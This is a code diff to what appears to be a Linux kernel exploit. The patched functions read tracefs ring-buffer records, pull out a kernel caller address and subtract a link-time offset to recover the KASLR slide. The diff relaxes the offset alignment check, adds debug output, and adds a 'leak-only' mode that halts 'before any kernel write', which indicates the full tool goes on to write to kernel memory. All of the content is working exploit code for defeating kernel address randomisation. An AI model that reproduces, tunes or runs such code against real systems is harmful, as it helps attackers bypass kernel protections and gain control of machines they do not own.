@@ -53,14 +53,24 @@ static int slide_tracefs_parse_page(
     }
     uint16_t event_id = 0;
     memcpy(&event_id, page + record, sizeof(event_id));
+    if (getenv("SLIDE_DEBUG")) {
+      fprintf(stderr, "[dbg] pos=%zu type_len=%u rec_len=%zu id=%u\n",
+               pos, type_len, record_len, event_id);
+    }
     if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
+      if (getenv("SLIDE_DEBUG")) {
+        fprintf(stderr, "[dbg] hit caller=%016llx want=%016llx\n",
+                 (unsigned long long)caller,
+                 (unsigned long long)(KIMAGE_TEXT_BASE +
+                                      SLIDE_TRACEFS_WORKER_CALLER_OFF));
+      }
       uint64_t link_caller =
           KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
       if (caller >= link_caller) {
         uint64_t candidate = caller - link_caller;
-        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+        if (candidate <= 0x1f0000ULL && (candidate & 0x7fffULL) == 0) {
           pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                      (unsigned long long)caller,
                      (unsigned long long)candidate);
@@ -141,7 +151,7 @@ int slide_leak_kernel_base(void) {
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
     if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+        (value & 0x7fffULL) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
@@ -155,5 +165,11 @@ int slide_leak_kernel_base(void) {
                (unsigned long long)kaslr_slide, slide_p0_offset);
     return 1;
   }
-  return slide_tracefs_leak_kernel_base();
+  int leak_only = getenv("SLIDE_LEAK_ONLY") != NULL;
+  int ok = slide_tracefs_leak_kernel_base();
+  if (ok && leak_only) {
+    pr_success("slide leak-only mode: stopping before any kernel write\n");
+    exit(0);
+  }
+  return ok;
 }
